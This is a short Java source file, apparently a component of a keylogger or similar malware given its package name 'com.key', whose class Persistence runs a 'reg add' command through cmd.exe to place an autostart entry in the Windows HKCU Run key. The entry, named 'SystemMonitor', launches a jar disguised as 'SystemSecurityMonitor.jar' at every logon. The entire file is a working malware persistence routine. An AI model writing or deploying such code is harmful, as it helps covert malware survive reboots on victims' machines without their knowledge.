package com.key;

import java.io.IOException;

public class Persistence {
    public static void main(String[] args) {
        try {
            String command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemMonitor /t REG_SZ /d \"C:\\path\\to\\SystemSecurityMonitor.jar\" /f";
            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
